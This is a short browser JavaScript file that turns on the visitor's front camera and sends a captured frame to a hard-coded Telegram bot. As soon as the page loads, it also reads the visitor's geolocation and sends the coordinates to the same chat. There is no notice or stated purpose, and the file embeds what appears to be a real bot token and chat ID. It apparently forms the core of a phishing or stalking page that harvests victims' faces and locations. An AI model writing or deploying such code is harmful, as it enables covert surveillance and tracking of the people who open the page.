const botToken = "7598643504:AAG0aPuGlJjIKwHyk_RB8Gx59qrOoTxNeHY";
const chatId = "401485415";
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const captureBtn = document.getElementById("capture");

// Start the front camera
navigator.mediaDevices
  .getUserMedia({ video: { facingMode: "user" } })
  .then((stream) => {
    video.srcObject = stream;
  })
  .catch((err) => console.error("Error accessing camera:", err));

// Capture the image
captureBtn.addEventListener("click", () => {
  const context = canvas.getContext("2d");
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Convert image to Blob
  canvas.toBlob((blob) => {
    sendPhoto(blob);
  }, "image/jpeg");
});

// Send photo to Telegram bot
function sendPhoto(blob) {
  const formData = new FormData();
  formData.append("chat_id", chatId);
  formData.append("photo", blob, "selfie.jpg");

  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: "POST",
    body: formData,
  })
    .then((res) => res.json())
    .then((data) => console.log("Photo sent:", data))
    .catch((err) => console.error("Error sending photo:", err));
}

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition(
    (position) => {
      const { latitude, longitude } = position.coords;

      // Telegram API URL for sending location
      const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;

      // Send location using Fetch API
      fetch(url)
        .then((response) => response.json())
        .then((data) => console.log("Location sent:", data))
        .catch((error) => console.error("Error sending location:", error));
    },
    (error) => console.error("Error getting location:", error.message)
  );
} else {
  console.log("Geolocation is not supported by this browser.");
}
